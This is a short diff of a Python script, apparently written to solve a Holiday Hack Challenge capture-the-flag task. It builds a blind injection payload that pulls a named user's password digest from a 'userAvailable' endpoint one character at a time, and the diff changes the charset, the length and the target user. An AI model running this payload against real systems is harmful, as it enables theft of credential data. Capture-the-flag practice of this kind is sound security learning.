@@ -4,17 +4,17 @@ import time
 # Target URL
 BASE_URL = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable"
 
-# Character set to test (expanded to cover printable ASCII)
+# Character set for a digest
 charset = "abcdef0123456789"
 
 # Max length of digest to extract
-MAX_LENGTH = 100
+MAX_LENGTH = 35
 
 # Result accumulator
 extracted = ""
 
 def check_char(position, char):
-    # Anchor on the specific user (harold) and extract from digest
+    # Change username as required
     payload = f"\" or (c.username='bruce' and SUBSTRING(c.digest,{position},1)='{char}')--"
     params = {
         "username": payload,
